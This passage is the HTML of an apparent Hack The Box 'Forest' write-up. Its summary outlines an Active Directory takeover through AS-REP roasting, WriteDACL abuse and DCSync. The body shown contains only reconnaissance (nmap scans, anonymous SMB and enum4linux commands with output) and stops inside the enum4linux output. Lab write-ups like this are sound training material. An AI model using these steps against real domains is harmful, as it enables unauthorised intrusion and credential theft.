@@ -1,0 +1,1335 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="In this box, we use RPC and LDAP to collect valid AD usernames. This allows us to perform ASREPRoasting, which yields a TGS that can be cracked. With these credentials, we can winRM into the machine. From the output of BloodHound, we learn that we can run ourselves into Exchange Windows Permissions, which has WriteDACL over the domain object. We grant ourselves full control over the domain and perform DCSync on the machine. Like this, we get an admin shell."><title>HTB Forest Writeup</title><link rel=canonical href=https://trinuro.github.io/p/htb-forest-writeup/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="HTB Forest Writeup"><meta property='og:description' content="In this box, we use RPC and LDAP to collect valid AD usernames. This allows us to perform ASREPRoasting, which yields a TGS that can be cracked. With these credentials, we can winRM into the machine. From the output of BloodHound, we learn that we can run ourselves into Exchange Windows Permissions, which has WriteDACL over the domain object. We grant ourselves full control over the domain and perform DCSync on the machine. Like this, we get an admin shell."><meta property='og:url' content='https://trinuro.github.io/p/htb-forest-writeup/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HTB'><meta property='article:published_time' content='2026-02-24T22:01:54-05:00'><meta property='article:modified_time' content='2026-02-24T22:01:54-05:00'><meta property='og:image' content='https://trinuro.github.io/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7.png'><meta name=twitter:title content="HTB Forest Writeup"><meta name=twitter:description content="In this box, we use RPC and LDAP to collect valid AD usernames. This allows us to perform ASREPRoasting, which yields a TGS that can be cracked. With these credentials, we can winRM into the machine. From the output of BloodHound, we learn that we can run ourselves into Exchange Windows Permissions, which has WriteDACL over the domain object. We grant ourselves full control over the domain and perform DCSync on the machine. Like this, we get an admin shell."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://trinuro.github.io/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#smb>SMB</a></li><li><a href=#rpc>RPC</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#kerbrute>Kerbrute</a></li><li><a href=#smb-as-svc-alfresco>SMB as svc-alfresco</a></li><li><a href=#winrm-as-svc-alfresco>WinRM as svc-alfresco</a></li><li><a href=#credential-hunting>Credential Hunting</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/htb-forest-writeup/><img src=/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7_hu_2829c126a7e03c09.png srcset="/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7_hu_2829c126a7e03c09.png 800w, /p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7_hu_20375a3d4a44b056.png 1600w" width=800 height=800 loading=lazy alt="Featured image of post HTB Forest Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/htb-writeups/>Htb-Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-forest-writeup/>HTB Forest Writeup</a></h2><h3 class=article-subtitle>In this box, we use RPC and LDAP to collect valid AD usernames. This allows us to perform ASREPRoasting, which yields a TGS that can be cracked. With these credentials, we can winRM into the machine. From the output of BloodHound, we learn that we can run ourselves into Exchange Windows Permissions, which has WriteDACL over the domain object. We grant ourselves full control over the domain and perform DCSync on the machine. Like this, we get an admin shell.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-02-24T22:01:54-05:00>Feb 24, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>20 minute read</time></div></footer></div></header><section class=article-content><h2 id=port-scan>Port Scan</h2><ol><li>Full TCP port scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.191.98 -sS -p- --min-rate <span class=m>20000</span> -oN nmap/fullportscan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Host is up (0.021s latency).
+</span></span><span class=line><span class=cl>Not shown: 65367 closed tcp ports (reset), 144 filtered tcp ports (no-response)
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE
+</span></span><span class=line><span class=cl>53/tcp    open  domain
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp   open  ldap
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5
+</span></span><span class=line><span class=cl>593/tcp   open  http-rpc-epmap
+</span></span><span class=line><span class=cl>636/tcp   open  ldapssl
+</span></span><span class=line><span class=cl>3268/tcp  open  globalcatLDAP
+</span></span><span class=line><span class=cl>3269/tcp  open  globalcatLDAPssl
+</span></span><span class=line><span class=cl>5985/tcp  open  wsman
+</span></span><span class=line><span class=cl>9389/tcp  open  adws
+</span></span><span class=line><span class=cl>47001/tcp open  winrm
+</span></span><span class=line><span class=cl>49664/tcp open  unknown
+</span></span><span class=line><span class=cl>49665/tcp open  unknown
+</span></span><span class=line><span class=cl>49666/tcp open  unknown
+</span></span><span class=line><span class=cl>49667/tcp open  unknown
+</span></span><span class=line><span class=cl>49671/tcp open  unknown
+</span></span><span class=line><span class=cl>49676/tcp open  unknown
+</span></span><span class=line><span class=cl>49677/tcp open  unknown
+</span></span><span class=line><span class=cl>49683/tcp open  unknown
+</span></span><span class=line><span class=cl>49698/tcp open  unknown
+</span></span><span class=line><span class=cl>60699/tcp open  unknown
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Script and version scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.191.98 -sC -sV -sS -p53,135,139,445 --min-rate <span class=m>20000</span> -oN nmap/scriptversionscan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Host is up (0.022s latency).
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE      VERSION
+</span></span><span class=line><span class=cl>53/tcp    open  domain       Simple DNS Plus
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-31 01:08:37Z)
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
+</span></span><span class=line><span class=cl>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl>|_http-title: Not Found
+</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span class=line><span class=cl>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl>|_http-title: Not Found
+</span></span><span class=line><span class=cl>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl>| smb2-time: 
+</span></span><span class=line><span class=cl>|   date: 2026-01-31T01:08:40
+</span></span><span class=line><span class=cl>|_  start_date: 2026-01-31T00:02:52
+</span></span><span class=line><span class=cl>| smb-security-mode: 
+</span></span><span class=line><span class=cl>|   account_used: guest
+</span></span><span class=line><span class=cl>|   authentication_level: user
+</span></span><span class=line><span class=cl>|   challenge_response: supported
+</span></span><span class=line><span class=cl>|_  message_signing: required
+</span></span><span class=line><span class=cl>|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
+</span></span><span class=line><span class=cl>| smb2-security-mode: 
+</span></span><span class=line><span class=cl>|   3:1:1: 
+</span></span><span class=line><span class=cl>|_    Message signing enabled and required
+</span></span><span class=line><span class=cl>| smb-os-discovery: 
+</span></span><span class=line><span class=cl>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+</span></span><span class=line><span class=cl>|   Computer name: FOREST
+</span></span><span class=line><span class=cl>|   NetBIOS computer name: FOREST\x00
+</span></span><span class=line><span class=cl>|   Domain name: htb.local
+</span></span><span class=line><span class=cl>|   Forest name: htb.local
+</span></span><span class=line><span class=cl>|   FQDN: FOREST.htb.local
+</span></span><span class=line><span class=cl>|_  System time: 2026-01-30T17:08:44-08:00
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
+</span></span></code></pre></td></tr></table></div></div><ul><li>Interesting</li></ul><ol start=3><li>UDP scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.191.98 -sU -p- --min-rate <span class=m>20000</span> 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 18:59 EST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.191.98
+</span></span><span class=line><span class=cl>Host is up.
+</span></span><span class=line><span class=cl>All 65535 scanned ports on 10.129.191.98 are in ignored states.
+</span></span><span class=line><span class=cl>Not shown: 65535 open|filtered udp ports (no-response)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
+</span></span></code></pre></td></tr></table></div></div><h2 id=smb>SMB</h2><ol><li>The SMB share allows anonymous logins. But somehow, we cannot list the shares.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>netexec smb 10.129.191.98 -u &#39;&#39; -p &#39;&#39;
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:True)
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    NONE             [+] \: 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smbclient -N -L \\\\10.129.191.98 -m SMB3
+</span></span><span class=line><span class=cl>Anonymous login successful
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        Sharename       Type      Comment
+</span></span><span class=line><span class=cl>        ---------       ----      -------
+</span></span><span class=line><span class=cl>Reconnecting with SMB1 for workgroup listing.
+</span></span><span class=line><span class=cl>do_connect: Connection to 10.129.191.98 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span></span><span class=line><span class=cl>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></td></tr></table></div></div><ul><li>Future me: Run with Guest and a fake account with no password too.</li></ul><ol start=2><li>I ran <code>enum4linux</code> in the background.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SH data-lang=SH><span class=line><span class=cl>enum4linux 10.129.191.98 -A -C
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span><span class=lnt>297
+</span><span class=lnt>298
+</span><span class=lnt>299
+</span><span class=lnt>300
+</span><span class=lnt>301
+</span><span class=lnt>302
+</span><span class=lnt>303
+</span><span class=lnt>304
+</span><span class=lnt>305
+</span><span class=lnt>306
+</span><span class=lnt>307
+</span><span class=lnt>308
